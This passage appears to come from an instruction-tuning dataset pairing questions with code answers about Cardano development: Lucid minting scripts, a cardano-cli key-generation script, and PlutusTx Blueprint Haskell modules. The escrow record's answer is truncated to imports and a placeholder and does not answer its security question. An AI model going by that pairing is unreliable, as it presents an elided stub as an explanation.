2200323333573466e1d4009200a21222222200423333573466e1d400d2008233221222222233001009008375c6ae854014dd69aba135744a00a46666ae68cdc3a8022400c4664424444444660040120106eb8d5d0a8039bae357426ae89401c8cccd5cd19b875005480108cc8848888888cc018024020c030d5d0a8049bae357426ae8940248cccd5cd19b875006480088c848888888c01c020c034d5d09aab9e500b23333573466e1d401d2000232122222223005008300e357426aae7940308c98c804ccd5ce00a00980880800780700680600589aab9d5004135573ca00626aae7940084d55cf280089baa0012323232323333573466e1d400520022333222122333001005004003375a6ae854010dd69aba15003375a6ae84d5d1280191999ab9a3370ea0049000119091180100198041aba135573ca00c464c6401866ae700340300280244d55cea80189aba25001135573ca00226ea80048c8c8cccd5cd19b875001480088c8488c00400cdd71aba135573ca00646666ae68cdc3a8012400046424460040066eb8d5d09aab9e500423263200933573801401200e00c26aae7540044dd500089119191999ab9a3370ea00290021091100091999ab9a3370ea00490011190911180180218031aba135573ca00846666ae68cdc3a801a400042444004464c6401466ae7002c02802001c0184d55cea80089baa0012323333573466e1d40052002200a23333573466e1d40092000200a23263200633573800e00c00800626aae74dd5000a4c24002921035054310032001355006222533500110022213500222330073330080020060010033200135500522225335001100222135002225335333573466e1c005200000a0091333008007006003133300800733500b12333001008003002006003122002122001112200212212233001004003112323001001223300330020020011",\", [utxo.txHash, BigInt(utxo.outputIndex), tn], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(nftPolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + tn; const tx = await lucid .newTx() .mintAssets({[unit]: 1n}, Data.void()) .attachMintingPolicy(nftPolicy) .collectFrom([utxo]) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); <s>"}
{"text": "<s>[inst] How do I use Lucid, Blockfrost, and a locally stored seed to mint a signed token on the Cardano blockchain? What steps should I follow to retrieve my public key hash, generate a policy requiring my signature, create a new transaction, mint the asset, add my key as a signer, and sign and submit the transaction? [/inst] import { Lucid, Blockfrost, Address, MintingPolicy, PolicyId, Unit, fromText, Data, getAddressDetails, applyParamsToScript } from \"https://deno.land/x/lucid@0.9.1/mod.ts\" import { blockfrostKey, secretSeed } from \"./secret.ts\" function readAmount(): bigint { const input = prompt(\"amount: \"); return input ? BigInt(Number.parseInt(input)) : 1000000n; } // set blockfrost endpoint const lucid = await Lucid.new( new Blockfrost( \"https://cardano-preprod.blockfrost.io/api/v0\", blockfrostKey ), \"Preprod\" ); // load local stored seed as a wallet into lucid lucid.selectWalletFromSeed(secretSeed); const addr: Address = await lucid.wallet.address(); console.log(\"own address: \" + addr); const pkh: string = getAddressDetails(addr).paymentCredential?.hash || \"\"; console.log(\"own pubkey hash: \" + pkh); const Params = Data.Tuple([Data.String]); type Params = Data.Static<typeof Params>; const signedPolicy: MintingPolicy = { type: \"PlutusV2\", script: applyParamsToScript<Params>( \59081a590817010000323232332232323232323232323233223233223232323232322223232533532323253353235001222222222222533533355301612001321233001225335002210031001002501f25335333573466e3c0440040b00ac4d408400454080010840b040a8d40048800840784cd5ce249116d697373696e67207369676e61747572650001d3333573466e1cd55cea80224000466442466002006004646464646464646464646464646666ae68cdc39aab9d500c480008cccccccccccc88888888888848cccccccccccc00403403002c02802402001c01801401000c008cd4060064d5d0a80619a80c00c9aba1500b33501801a35742a014666aa038eb9406cd5d0a804999aa80e3ae501b35742a01066a03004a6ae85401cccd54070099d69aba150063232323333573466e1cd55cea801240004664424660020060046464646666ae68cdc39aab9d5002480008cc8848cc00400c008cd40c1d69aba150023031357426ae8940088c98c80cccd5ce01b01a81889aab9e5001137540026ae854008c8c8c8cccd5cd19b8735573aa004900011991091980080180119a8183ad35742a00460626ae84d5d1280111931901999ab9c036035031135573ca00226ea8004d5d09aba2500223263202f33573806406205a26aae7940044dd50009aba1500533501875c6ae854010ccd540700888004d5d0a801999aa80e3ae200135742a00460486ae84d5d1280111931901599ab9c02e02d029135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d5d1280089aba25001135744a00226ae8940044d55cf280089baa00135742a00860286ae84d5d1280211931900e99ab9c02001f01b3333573466e1cd55ce9baa0054800080788c98c8070cd5ce00f80f00d1bae005101c13263201a3357389201035054350001c135573ca00226ea8004c8004d5406088448894cd40044d400c88004884ccd401488008c010008ccd54c01c4800401401000448c88c008dd6000990009aa80c111999aab9f0012500a233500930043574200460066ae880080608c8c8cccd5cd19b8735573aa004900011991091980080180118071aba150023005357426ae8940088c98c8058cd5ce00c80c00a09aab9e5001137540024646464646666ae68cdc39aab9d5004480008cccc888848cccc00401401000c008c8c8c8cccd5cd19b8735573aa0049000119910919800801801180b9aba1500233500f016357426ae8940088c98c806ccd5ce00f00e80c89aab9e5001137540026ae854010ccd54021d728039aba150033232323333573466e1d4005200423212223002004357426aae79400c8cccd5cd19b875002480088c84888c004010dd71aba135573ca00846666ae68cdc3a801a400042444006464c6403a66ae7008007c06c0680644d55cea80089baa00135742a00466a016eb8d5d09aba2500223263201733573803403202a26ae8940044d5d1280089aab9e500113754002266aa002eb9d6889119118011bab00132001355015223233335573e0044a010466a00e66442466002006004600c6aae754008c014d55cf280118021aba200301613574200222440042442446600200800624464646666ae68cdc3a800a400046a00e600a6ae84d55cf280191999ab9a3370ea00490011280391931900919ab9c01501401000f135573aa00226ea800448488c00800c44880048c8c8cccd5cd19b875001480188c848888c010014c01cd5d09aab9e500323333573466e1d400920042321222230020053009357426aae7940108cccd5cd19b875003480088c848888c004014c01cd5d09aab9e500523333573466e1d40112000232122223003005375c6ae84d55cf280311931900819ab9c01301200e00d00c00b135573aa00226ea80048c8c8cccd5cd19b8735573aa004900011991091980080180118029aba15002375a6ae84d5d1280111931900619ab9c00f00e00a135573ca00226ea80048c8cccd5cd19b8735573aa002900011bae357426aae7940088c98c8028cd5ce00680600409baa001232323232323333573466e1d4005200c21222222200323333573466e1d4009200a21222222200423333573466e1d400d2008233221222222233001009008375c6ae854014dd69aba135744a00a46666ae68cdc3a8022400c4664424444444660040120106eb8d5d0a8039bae357426ae89401c8cccd5cd19b875005480108cc8848888888cc018024020c030d5d0a8049bae357426ae8940248cccd5cd19b875006480088c848888888c01c020c034d5d09aab9e500b23333573466e1d401d2000232122222223005008300e357426aae7940308c98c804ccd5ce00b00a80880800780700680600589aab9d5004135573ca00626aae7940084d55cf280089baa0012323232323333573466e1d400520022333222122333001005004003375a6ae854010dd69aba15003375a6ae84d5d1280191999ab9a3370ea0049000119091180100198041aba135573ca00c464c6401866ae7003c0380280244d55cea80189aba25001135573ca00226ea80048c8c8cccd5cd19b875001480088c8488c00400cdd71aba135573ca00646666ae68cdc3a8012400046424460040066eb8d5d09aab9e500423263200933573801801600e00c26aae7540044dd500089119191999ab9a3370ea00290021091100091999ab9a3370ea00490011190911180180218031aba135573ca00846666ae68cdc3a801a400042444004464c6401466ae7003403002001c0184d55cea80089baa0012323333573466e1d40052002200623333573466e1d40092000200623263200633573801201000800626aae74dd5000a4c2440042440022400292010350543100112323001001223300330020020011",\" [pkh], Params) }; const policyId: PolicyId = lucid.utils.mintingPolicyToId(signedPolicy); console.log(\"minting policy: \" + policyId); const unit: Unit = policyId + fromText(\"PPP Signed\"); const amount: bigint = readAmount(); const tx = await lucid .newTx() .mintAssets({[unit]: amount}, Data.void()) .attachMintingPolicy(signedPolicy) .addSignerKey(pkh) .complete(); const signedTx = await tx.sign().complete(); const txHash = await signedTx.submit(); console.log(\"tid: \" + txHash); <s>"}
{"text": "<s>[inst] How to create Key pair? [/inst] #!/bin/bash\n\nif [ -z \"$1\" ]; then\n    >&2 echo \"expected name as argument\"\n    exit 1\nfi\n\npath=/workspaces/plutus-pioneer-program/keys\nmkdir -p \"$path\"\n\nvkey=\"$path/$1.vkey\"\nskey=\"$path/$1.skey\"\naddr=\"$path/$1.addr\"\n\nif [ -f \"$vkey\" ]; then\n    >&2 echo \"verification key file $vkey already exists\"\n    exit 1\nfi\n\nif [ -f \"$skey\" ]; then\n    >&2 echo \"signing key file $skey already exists\"\n    exit 1\nfi\n\nif [ -f \"$addr\" ]; then\n    >&2 echo \"address file $addr already exists\"\n    exit 1\nfi\n\ncardano-cli address key-gen --verification-key-file \"$vkey\" --signing-key-file \"$skey\" &&\ncardano-cli address build --payment-verification-key-file \"$vkey\" --testnet-magic 2 --out-file \"$addr\"\n\necho \"wrote verification key to: $vkey\"\necho \"wrote signing key to: $skey\"\necho \"wrote address to: $addr\"</s>"}
{"text": "<s>[inst] How does the Cardano escrow contract, defined by a list of targets associated with values, ensure secure and reliable exchange of value between multiple parties? By incorporating checks for payment to each target, deadlines for spending, and simplified refund policies, does the escrow contract effectively prevent fraud and ensure that all parties receive the agreed-upon funds? [/inst] {-# LANGUAGE DataKinds #-}{-# LANGUAGE DeriveAnyClass #-}{-# LANGUAGE DeriveGeneric #-}{-# LANGUAGE DerivingStrategies #-}{-# LANGUAGE FlexibleContexts #-}{-# LANGUAGE LambdaCase #-}{-# LANGUAGE MultiParamTypeClasses #-}{-# LANGUAGE NamedFieldPuns #-}{-# LANGUAGE OverloadedStrings #-}{-# LANGUAGE TemplateHaskell #-}{-# LANGUAGE TupleSections #-}{-# LANGUAGE TypeApplications #-}{-# LANGUAGE TypeFamilies #-}{-# LANGUAGE TypeOperators #-}{-# LANGUAGE UndecidableInstances #-}{-# LANGUAGE ViewPatterns #-}{-# OPTIONS_GHC -g -fplugin-opt PlutusTx.Plugin:coverage-all #-}-- | A general-purpose escrow contract in Plutusmodule Contract.Escrow (Escrow, EscrowError (..), AsEscrowError (..), EscrowParams (..), EscrowTarget (..), payToScriptTarget, payToPaymentPubKeyTarget, targetTotal, payRedeemRefund, typedValidator,-- * Actionspay, redeem, refund, badRefund, RedeemFailReason (..), RedeemSuccess (..), RefundSuccess (..),-- * Exposed for test endpointsAction (..), Datum, validate,-- * CoveragecovIdx,) whereimport Control.Lens (makeClassyPrisms)import Control.Monad (void)import Control.Monad.Except (catchError, throwError)import Control.Monad.RWS.Class (asks)import Data.Map qualified as Mapimport Cardano.Api qualified as Cimport Cardano.Api.Shelley qualified as Cimport PlutusTx (ToData)import PlutusTx qualifiedimport PlutusTx.Code (getCovIdx)import PlutusTx.Coverage (CoverageIndex)import PlutusTx.Prelude (error)import PlutusTx.Prelude qualified as P -- ... rest of the code ... <s>"}
{"text": "<s>[inst] How does the \"deriveDefinitions\" function in the \"PlutusTx.Blueprint.Definition.Derive\" module use a repetition process and the \"DefinitionsFor\" class to build the necessary information for a group of types? Moreover, how does the \"DefinitionRef\" class make it easier and safer for developers to find and use schema definitions, ensuring that the correct schema data is accessed in a secure and error-free way? [/inst] {-# LANGUAGE AllowAmbiguousTypes   #-} {-# LANGUAGE ConstraintKinds       #-} {-# LANGUAGE DataKinds             #-} {-# LANGUAGE FlexibleContexts      #-} {-# LANGUAGE FlexibleInstances     #-} {-# LANGUAGE MultiParamTypeClasses #-} {-# LANGUAGE PolyKinds             #-} {-# LANGUAGE TypeApplications      #-} {-# LANGUAGE TypeOperators         #-} module PlutusTx.Blueprint.Definition.Derive where import PlutusTx.Blueprint.Class (HasBlueprintSchema (..)) import PlutusTx.Blueprint.Definition.Internal (Definition (..), Definitions (..), addDefinition) import PlutusTx.Blueprint.Definition.Unroll (HasBlueprintDefinition (definitionId), UnrollAll) import PlutusTx.Blueprint.Schema (Schema (..)) -- | Derive a 'Definitions' value for a list of types. deriveDefinitions :: forall ts. (DefinitionsFor (UnrollAll ts)) => Definitions (UnrollAll ts) deriveDefinitions = definitionsFor @(UnrollAll ts) -- | Construct a 'Schema' that is a reference to a schema definition. definitionRef :: forall t ts. (HasBlueprintDefinition t) => Schema ts definitionRef = SchemaDefinitionRef (definitionId @t) {- | This class and its two instances are used internally to derive 'Definitions' for a given list of types. -} type DefinitionsFor ts = DefinitionsFor' ts ts definitionsFor :: forall ts. (DefinitionsFor ts) => Definitions ts definitionsFor = definitionsFor' @ts @ts class DefinitionsFor' referencedTypes acc where definitionsFor' :: Definitions referencedTypes instance DefinitionsFor' referencedTypes '[] where definitionsFor' = NoDefinitions instance ( HasBlueprintDefinition t , HasBlueprintSchema t referencedTypes , DefinitionsFor' referencedTypes ts ) => DefinitionsFor' referencedTypes (t ': ts) where definitionsFor' = addDefinition (definitionsFor' @referencedTypes @ts) (MkDefinition (definitionId @t) (schema @t)) </s>"}
{"text": "<s>[inst] How does the \"DefinitionId\" module in the \"PlutusTx.Blueprint.Definition\" package enable the creation of \"DefinitionId\" values, which act as references to schema definitions? How do the \"definitionIdFromType\" and \"definitionIdFromTypeK\" functions use Typeable constraints to convert types to \"DefinitionId\" values, and how can special cases such as \"Unit\", \"List\", and tuple types be represented as \"DefinitionId\" values? [/inst] {-# LANGUAGE AllowAmbiguousTypes #-} {-# LANGUAGE DeriveDataTypeable  #-} {-# LANGUAGE DerivingStrategies  #-} {-# LANGUAGE OverloadedStrings   #-} {-# LANGUAGE PolyKinds           #-} {-# LANGUAGE TypeApplications    #-} module PlutusTx.Blueprint.Definition.Id ( DefinitionId , definitionIdFromType , definitionIdFromTypeK , definitionIdToText , definitionIdUnit , definitionIdList , definitionIdTuple2 , definitionIdTuple3 ) where import Prelude import Data.Aeson (ToJSON, ToJSONKey) import Data.Data (Data) import Data.Kind (Type) import Data.Proxy (Proxy (..)) import Data.Text (Text, pack) import Data.Typeable (Typeable, typeRep) import GHC.Generics (Generic) -- | A reference to a Schema definition. newtype DefinitionId = MkDefinitionId {definitionIdToText :: Text} deriving stock (Show, Generic, Data) deriving newtype (Eq, Ord, ToJSON, ToJSONKey) instance Semigroup DefinitionId where (<>) l r = MkDefinitionId $ definitionIdToText l <> \"_\" <> definitionIdToText r -- | Creates a 'DefinitionId' from a type with a kind 'Type'. definitionIdFromType :: forall (t :: Type). (Typeable t) => DefinitionId definitionIdFromType = MkDefinitionId . pack . show . typeRep $ Proxy @t {- | Creates a 'DefinitionId' from a type with a kind other than 'Type'. Example: > definitionIdFromTypeK @(Type -> Type) @Maybe -} definitionIdFromTypeK :: forall k (t :: k). (Typeable (t :: k)) => DefinitionId definitionIdFromTypeK = MkDefinitionId . pack . show . typeRep $ Proxy @(t :: k) -- Special cases that we want to be alphanumeric instead of symbolic, -- E.g. \"Unit\" instead of \"()\", \"List\" instead of \"[]\" etc. definitionIdUnit :: DefinitionId definitionIdUnit = MkDefinitionId \"Unit\" definitionIdList :: DefinitionId definitionIdList = MkDefinitionId \"List\" definitionIdTuple2 :: DefinitionId definitionIdTuple2 = MkDefinitionId \"Tuple2\" definitionIdTuple3 :: DefinitionId definitionIdTuple3 = MkDefinitionId \"Tuple3\" </s>"}
{"text": "<s>[inst] How do the \"Definition\" and \"Definitions\" data types in the \"Internal\" module of \"PlutusTx.Blueprint.Definition\" allow for managing schema definitions and references to those definitions? What role does the \"AddDefinition\" function play in adding new definitions to a registry, and how does the \"definitionsToMap\" function enable converting a registry of schema definitions to a Map from \"DefinitionId\" values to values of a user-defined type? [/inst] {-# LANGUAGE AllowAmbiguousTypes      #-} {-# LANGUAGE ConstraintKinds          #-} {-# LANGUAGE DataKinds                #-} {-# LANGUAGE DerivingStrategies       #-} {-# LANGUAGE FlexibleContexts         #-} {-# LANGUAGE FlexibleInstances        #-} {-# LANGUAGE GADTs                    #-} {-# LANGUAGE MultiParamTypeClasses    #-} {-# LANGUAGE PolyKinds                #-} {-# LANGUAGE RankNTypes               #-} {-# LANGUAGE StandaloneKindSignatures #-} {-# LANGUAGE TypeFamilies             #-} {-# LANGUAGE TypeOperators            #-} {-# LANGUAGE UndecidableInstances     #-} {-# OPTIONS_GHC -Wno-redundant-constraints #-} {-# OPTIONS_GHC -Wno-unticked-promoted-constructors #-} -- | This module provides a functionality to derive and reference schema definitions. module PlutusTx.Blueprint.Definition.Internal where import Prelude import Data.Kind (Constraint, Type) import Data.Map (Map) import Data.Map qualified as Map import GHC.TypeLits qualified as GHC import PlutusTx.Blueprint.Definition.Id (DefinitionId) import PlutusTx.Blueprint.Schema (Schema (..)) -- | A schema definition of a type @t@ with a list of referenced types @ts@. data Definition t ts = MkDefinition DefinitionId (Schema ts) deriving stock (Show) -- | A registry of schema definitions. data Definitions ts where NoDefinitions :: Definitions ts AddDefinition :: Definition t ts -> Definitions ts -> Definitions ts deriving stock instance Show (Definitions ts) -- | Add a schema definition to a registry. addDefinition :: Definitions ts -> Definition t ts -> Definitions ts addDefinition NoDefinitions d       = AddDefinition d NoDefinitions addDefinition (AddDefinition t s) d = AddDefinition d (AddDefinition t s) definitionsToMap :: Definitions ts -> (forall xs. Schema xs -> v) -> Map DefinitionId v definitionsToMap NoDefinitions _k = Map.empty definitionsToMap (AddDefinition (MkDefinition defId v) s) k = Map.insert defId (k v) (definitionsToMap s k) {- | A constraint that checks if a schema definition is present in a list of schema definitions. Gives a user-friendly error message if the schema definition is not found. -} type HasSchemaDefinition t ts = HasSchemaDefinition' t ts ts type HasSchemaDefinition' :: Type -> [Type] -> [Type] -> Constraint type family HasSchemaDefinition' n xs xs0 where HasSchemaDefinition' x (x ': xs) _ = () HasSchemaDefinition' x (_ ': xs) xs0 = HasSchemaDefinition' x xs xs0 HasSchemaDefinition' n xs xs0 = GHC.TypeError ( GHC.ShowType n GHC.:<>: GHC.Text \" type was not found in the list of types having schema definitions: \" GHC.:<>: GHC.ShowType xs0 ) </s>"}
{"text": "<s>[inst] What are some of the type-level functions provided in the \"PlutusTx.Blueprint.Definition.TF\" module? How do they work and what are their purposes? In particular, what is the significance of the \"IfStuckRep\" and \"IfStuckUnroll\" functions for detecting stuck type families, and how do the \"Insert\", \"Concat\", \"(++)\", \"Reverse\", and \"Nub\" functions operate on type-level lists? [/inst] {-# LANGUAGE DataKinds                #-} {-# LANGUAGE PolyKinds                #-} {-# LANGUAGE StandaloneKindSignatures #-} {-# LANGUAGE TypeFamilies             #-} {-# LANGUAGE TypeOperators            #-} {-# LANGUAGE UndecidableInstances     #-} module PlutusTx.Blueprint.Definition.TF where import Data.Kind (Type) import GHC.Generics (K1, M1, U1, type (:*:), type (:+:)) ---------------------------------------------------------------------------------------------------- -- Detect stuck type families: https://blog.csongor.co.uk/report-stuck-families/#custom-type-errors type family IfStuckUnroll (e :: [Type]) (t :: [Type]) :: [Type] where IfStuckUnroll _ '[] = '[] IfStuckUnroll _ (x ': xs) = (x ': xs) IfStuckUnroll e _ = e type family IfStuckRep e (rep :: Type -> Type) :: Type -> Type where IfStuckRep _ (M1 a b c) = M1 a b c IfStuckRep _ (f :*: g) = f :*: g IfStuckRep _ (f :+: g) = f :+: g IfStuckRep _ (K1 a b) = K1 a b IfStuckRep e U1 = U1 IfStuckRep e x = e ---------------------------------------------------------------------------------------------------- -- Type-level list operations ---------------------------------------------------------------------- -- | Insert @x@ into @xs@ unless it's already there. type Insert :: forall k. k -> [k] -> [k] type family Insert x xs where Insert x '[] = '[x] Insert x (x : xs) = x ': xs Insert x (y : xs) = y ': Insert x xs -- | Concatenates two type-level lists type Concat :: forall k. [k] -> [k] -> [k] type family Concat (as :: [k]) (bs :: [k]) :: [k] where Concat '[] bs = bs Concat as '[] = as Concat (a : as) bs = a ': Concat as bs -- | Concatenates two type-level lists removing duplicates. type (++) :: forall k. [k] -> [k] -> [k] type family (as :: [k]) ++ (bs :: [k]) :: [k] where '[] ++ bs = bs as ++ '[] = as (a : as) ++ bs = Insert a (as ++ bs) infixr 5 ++ type family Reverse (xs :: [k]) :: [k] where Reverse '[] = '[] Reverse (x ': xs) = Append (Reverse xs) '[x] type family Append (xs :: [k]) (ys :: [k]) :: [k] where Append '[] ys = ys Append (x ': xs) ys = x ': Append xs ys type family Nub xs where Nub xs = NubHelper '[] xs type family NubHelper acc xs where NubHelper acc '[] = acc NubHelper acc (x ': xs) = NubHelper (Insert x acc) xs </s>"}
{"text": "<s>[inst]What is the purpose of the \"HasBlueprintDefinition\" class and the \"Unroll\" type family in the \"PlutusTx.Blueprint.Definition.Unroll\" module? How does the \"Unroll\" type family unroll a type into a list of all its nested types (including the type itself), and how does the class ensure that each type has a unique \"DefinitionId\"? What is the role of the \"RepIsStuckError\" type in handling cases where the type-level computation becomes stuck?[/inst]{-# LANGUAGE AllowAmbiguousTypes   #-}{-# LANGUAGE ConstraintKinds       #-}{-# LANGUAGE DataKinds             #-}{-# LANGUAGE DefaultSignatures     #-}{-# LANGUAGE DerivingStrategies    #-}{-# LANGUAGE FlexibleContexts      #-}{-# LANGUAGE FlexibleInstances     #-}{-# LANGUAGE GADTs                 #-}{-# LANGUAGE MultiParamTypeClasses #-}{-# LANGUAGE PolyKinds             #-}{-# LANGUAGE RankNTypes            #-}{-# LANGUAGE TypeApplications      #-}{-# LANGUAGE TypeFamilies          #-}{-# LANGUAGE TypeOperators         #-}{-# LANGUAGE UndecidableInstances  #-}{-# OPTIONS_GHC -Wno-unticked-promoted-constructors #-}module PlutusTx.Blueprint.Definition.Unroll where import Prelude import Data.Kind (Type) import Data.Typeable (Typeable) import Data.Void (Void) import GHC.Generics (Generic (Rep), K1, M1, U1, type (:*:), type (:+:)) import GHC.TypeLits qualified as GHC import PlutusTx.Blueprint.Definition.Id (DefinitionId (..), definitionIdFromType, definitionIdFromTypeK, definitionIdList, definitionIdTuple2, definitionIdTuple3, definitionIdUnit) import PlutusTx.Blueprint.Definition.TF (Concat, IfStuckRep, IfStuckUnroll, Insert, Nub, Reverse, type (++)) import PlutusTx.Builtins.Internal (BuiltinByteString, BuiltinData, BuiltinList, BuiltinPair, BuiltinString, BuiltinUnit)---------------------------------------------------------------------------------------------------- -- Functionality to \"unroll\" types. -- For more context see Note [\"Unrolling\" types] -----------{- Note [\"Unrolling\" types]ContractBlueprint needs to be parameterized by a list of types used in a contract's type signature (including nested types) in order to:  a) produce a JSON-schema definition for every type used.  b) ensure that the schema definitions are referenced in a type-safe way.Given the following contract validator's type signature:  typedValidator :: Redeemer -> Datum -> ScriptContext -> Booland the following data type definitions:  data Redeemer = MkRedeemer MyStruct  data MyStruct = MkMyStruct { field1 :: Integer, field2 :: Bool }  type Datum = ()The ContractBlueprint type should be:  ContractBlueprint '[Redeemer, MyStruct, Integer, Bool, ()]However, for contract blurprints authors specifying all the nested types manually is cumbersome and error-prone. To make it easier to work with, we provide the Unroll type family that can be used to traverse a type accumulating all types nested within it:  Unroll Redeemer ~ '[Redeemer, MyStruct, Integer, Bool]  UnrollAll '[Redeemer, Datum] ~ '[Redeemer, MyStruct, Integer, Bool, ()]This way blueprint authors can specify the top-level types used in a contract and the UnrollAll type family will take care of discovering all the nested types:  Blueprint '[Redeemer, Datum]  is equivalent to  ContractBlueprint '[Redeemer, MyStruct, Integer, Bool, ()]-}{- | Designates a class of types that could be used as a Blueprint Definition.     Each such type:     - could be unrolled to a list of all nested types (including the type itself).     - has a unique 'DefinitionId'.-}class HasBlueprintDefinition (t :: Type) where  type Unroll t :: [Type]  type Unroll t = Insert t (GUnroll (IfStuckRep (RepIsStuckError t) (Rep t)))  definitionId :: DefinitionId  -- | Derive a 'DefinitionId' for a type.  default definitionId :: (Typeable t) => DefinitionId  definitionId = definitionIdFromType @tinstance HasBlueprintDefinition Void where  type Unroll Void = '[Void]instance HasBlueprintDefinition () where  type Unroll () = '[()]  definitionId = definitionIdUnitinstance HasBlueprintDefinition Bool where  type Unroll Bool = '[Bool]instance HasBlueprintDefinition Int where  type Unroll Int = '[Int]instance HasBlueprintDefinition Integer where  type Unroll Integer = '[Integer]instance HasBlueprintDefinition BuiltinData where  type Unroll BuiltinData = '[BuiltinData]instance HasBlueprintDefinition BuiltinUnit where  type Unroll BuiltinUnit = '[BuiltinUnit]instance HasBlueprintDefinition BuiltinString where  type Unroll BuiltinString = '[BuiltinString]instance HasBlueprintDefinition BuiltinByteString where  type Unroll BuiltinByteString = '[BuiltinByteString]instance (HasBlueprintDefinition a) => HasBlueprintDefinition (BuiltinList a) where  type Unroll (BuiltinList a) = Insert (BuiltinList a) (Unrolled a)  definitionId = definitionIdFromTypeK @(Type -> Type) @BuiltinList <> definitionId @ainstance (HasBlueprintDefinition a, HasBlueprintDefinition b) => HasBlueprintDefinition (BuiltinPair a b) where  type Unroll (BuiltinPair a b) = Insert (BuiltinPair a b) (Unrolled a ++ Unrolled b)  definitionId = definitionIdFromTypeK @(Type -> Type -> Type) @BuiltinPair      <> definitionId @a      <> definitionId @binstance (HasBlueprintDefinition a) => HasBlueprintDefinition (Maybe a) where  type Unroll (Maybe a) = Insert (Maybe a) (Unrolled a)  definitionId = definitionIdFromTypeK @(Type -> Type) @Maybe <> definitionId @ainstance (HasBlueprintDefinition a) => HasBlueprintDefinition [a] where  type Unroll [a] = Insert [a] (Unrolled a)  definitionId = definitionIdList <> definitionId @ainstance (HasBlueprintDefinition a, HasBlueprintDefinition b) => HasBlueprintDefinition (a, b) where  type Unroll (a, b) = Insert (a, b) (Unrolled a ++ Unrolled b)  definitionId = definitionIdTuple2 <> definitionId @a <> definitionId @binstance (HasBlueprintDefinition a, HasBlueprintDefinition b, HasBlueprintDefinition c) => HasBlueprintDefinition (a, b, c) where  type Unroll (a, b, c) = Insert (a, b, c) (Unrolled a ++ Unrolled b ++ Unrolled c)  definitionId = definitionIdTuple3 <> definitionId @a <> definitionId @b <> definitionId @c{- | Compile-time error that happens when a type couldn't be unrolled ('Unroll' TF is \"stuck\")-}type family UnrollIsStuckError x where  UnrollIsStuckError x =    GHC.TypeError (GHC.Text \"No instance: \" GHC.:<>: GHC.ShowType (HasBlueprintDefinition x)){- | Compile-time error that happens when type's generic representation is not defined ('Rep' TF is \"stuck\")-}type family RepIsStuckError x where  RepIsStuckError x =    GHC.TypeError (GHC.Text \"No instance: \" GHC.:<>: GHC.ShowType (Generic x))-- | Same as 'Unroll' but with a nicer error message type Unrolled t = Reverse (IfStuckUnroll (UnrollIsStuckError t) (Unroll t))-- | Unrolls all types in the list 'xs' type family UnrollAll xs :: [Type] where  UnrollAll '[] = '[]  UnrollAll (x ': xs) = Nub (Concat (Unrolled x) (UnrollAll xs))-- | Unroll a generic representation of a type into a list of all nested types. type family GUnroll (t :: Type -> Type) :: [Type] where  GUnroll (M1 _ _ f) = GUnroll f  GUnroll (f :*: g) = GUnroll f ++ GUnroll g  GUnroll (f :+: g) = GUnroll f ++ GUnroll g  GUnroll (K1 _ c) = Unrolled c  GUnroll U1 = '[]<s>"}
{"text": "<s>[inst]What is the purpose of the \"ArgumentBlueprint\" data type in the \"PlutusTx.Blueprint.Argument\" module? What fields are included in an \"ArgumentBlueprint\" and what information do they provide about the validator's runtime argument? How is the \"ArgumentBlueprint\" used to define the Blueprint for a datum or redeemer, and what role does the \"Schema\" field play in describing the argument's data structure?[/inst]{-# LANGUAGE DataKinds          #-}{-# LANGUAGE DerivingStrategies #-}{-# LANGUAGE KindSignatures     #-}{-# LANGUAGE OverloadedStrings  #-}{-# LANGUAGE RecordWildCards    #-}module PlutusTx.Blueprint.Argument where import Prelude import Data.Aeson (ToJSON (..)) import Data.Aeson.Extra (buildObject, optionalField, requiredField) import Data.Kind (Type) import Data.Set (Set) import Data.Text (Text) import PlutusTx.Blueprint.Parameter (oneOfASet) import PlutusTx.Blueprint.Purpose (Purpose) import PlutusTx.Blueprint.Schema (Schema) -- | Blueprint that defines a validator's runtime argument: datum or redeemer. data ArgumentBlueprint (referencedTypes :: [Type]) = MkArgumentBlueprint { argumentTitle       :: Maybe Text -- ^ A short and descriptive name for the redeemer or datum. , argumentDescription :: Maybe Text -- ^ An informative description of the redeemer or datum. , argumentPurpose     :: Set Purpose -- ^ A possibly empty set of purposes for the redeemer or datum. , argumentSchema      :: Schema referencedTypes -- ^ A Plutus Data Schema. } deriving stock (Show, Eq, Ord) instance ToJSON (ArgumentBlueprint referencedTypes) where toJSON MkArgumentBlueprint{..} = buildObject $ requiredField \"schema\" argumentSchema . optionalField \"title\" argumentTitle . optionalField \"description\" argumentDescription . optionalField \"purpose\" (oneOfASet argumentPurpose)"}
{"text": "<s>[inst]What is the purpose of the \"HasBlueprintSchema\" class and its instances in the \"PlutusTx.Blueprint.Class\" module? How does the class allow types to have a Plutus Data Schema definition and reference other schema definitions, and how does it provide a common interface for working with the schema information for these types? What built-in types and compound types (such as lists and pairs) have instances defined for the \"HasBlueprintSchema\" class, and how are their schemas defined using the class?[/inst]{-# LANGUAGE AllowAmbiguousTypes   #-}{-# LANGUAGE DataKinds             #-}{-# LANGUAGE DuplicateRecordFields #-}{-# LANGUAGE FlexibleInstances     #-}{-# LANGUAGE MultiParamTypeClasses #-}{-# LANGUAGE PolyKinds             #-}{-# LANGUAGE ScopedTypeVariables   #-}{-# LANGUAGE TypeApplications      #-}{-# LANGUAGE TypeFamilies          #-}{-# LANGUAGE UndecidableInstances  #-}module PlutusTx.Blueprint.Class where import Prelude hiding (maximum, minimum) import Data.ByteString (ByteString) import Data.Kind (Type) import PlutusTx.Blueprint.Schema (ListSchema (..), PairSchema (..), Schema (..), emptyBytesSchema, emptyIntegerSchema) import PlutusTx.Blueprint.Schema.Annotation (emptySchemaInfo) import PlutusTx.Builtins (BuiltinByteString, BuiltinData, BuiltinString) import PlutusTx.Builtins.Internal (BuiltinBool, BuiltinList, BuiltinPair, BuiltinUnit) {- | A class of types that have a Blueprint schema definition and can reference other schema definitions of other types. -} class HasBlueprintSchema (t :: Type) (referencedTypes :: [Type]) where schema :: Schema referencedTypes instance HasBlueprintSchema Int referencedTypes where schema = SchemaInteger emptySchemaInfo emptyIntegerSchema instance HasBlueprintSchema Integer referencedTypes where schema = SchemaInteger emptySchemaInfo emptyIntegerSchema instance HasBlueprintSchema BuiltinData referencedTypes where schema = SchemaBuiltInData emptySchemaInfo instance HasBlueprintSchema BuiltinUnit referencedTypes where schema = SchemaBuiltInUnit emptySchemaInfo instance HasBlueprintSchema BuiltinBool 